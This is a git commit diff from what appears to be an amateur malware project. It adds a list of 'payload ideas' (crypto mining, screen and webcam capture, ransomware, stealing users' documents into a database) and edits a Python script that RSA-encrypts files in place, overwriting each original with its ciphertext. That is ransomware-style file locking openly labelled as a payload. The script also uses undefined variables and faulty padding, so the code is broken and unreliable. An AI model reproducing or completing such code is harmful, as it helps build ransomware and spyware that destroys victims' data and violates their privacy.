11417dccf17cf45ebf19720c402d4e23f213b8a1
Matt N <mattnappo@gmail.com>
2018-08-23 22:01:57 -0400

    Testing key

---
+++ payload/payload_ideas.md
@@ -0,0 +1,7 @@
+# Payload Ideas
+
+* Crypto mining
+* Screen cap
+* Webcam cap
+* Some ransomware
+* Download the user's documents & put in a MONGO database (for the reemes)
--- payload/rsa/encrypt.py
+++ payload/rsa/encrypt.py
@@ -13,22 +13,20 @@ class Encrypt():
         self.files = files
         for f in self.files:
             self.encrypt(f)
+
     def encrypt(self, file_name):
         raw_data = None
         with open(file_name, "rb") as f:
             raw_data = fd.read()
-
-    
-
         raw_data = zlib.compress(raw_data) # First, compress the data of the file
 
         # In determining the chunk size, determine the private key length used in bytes
         # and subtract 42 bytes (when using PKCS1_OAEP). The data will be in encrypted in chunks
-
         chunk_size = 470
         offset = 0
-        encrypted =  "" # String storing the current encrypted file
+        encrypted = "" # String to store the current encrypted file
         end_loop = False
+        
         while not end_loop:
             chunk = blob[offset:offset + chunk_size] # Current chunk
             if len(chunk) % chunk_size != 0: # Add padding, this means that the loop reached the end of the file
@@ -36,13 +34,11 @@ class Encrypt():
                 chunk += " " * (chunk_size - len(chunk))
             encrypted += rsa_key.encrypt(chunk) # Append the encrypted chunk to the overall encrypted file
             offset += chunk_size # Increase the offset by chunk size
-        return base64.b64encode(encrypted) # Base 64 encode the encrypted file
-
-
-        #Write the encrypted contents to a file
+        
+        # Write the encrypted contents to a file
         fd = open("encrypted_img.jpg", "wb")
-        fd.write(encrypted_blob)
-        fd.close()
+        with open(file_name, "wb") as f:
+            f.write(base64.b64encode(encrypted)) # Write the base 64 encode the encrypted file
 
 Encrypt(
     [
@@ -51,4 +47,3 @@ Encrypt(
     ],
     "607dbef"
 )
-#Our candidate file to be encrypted
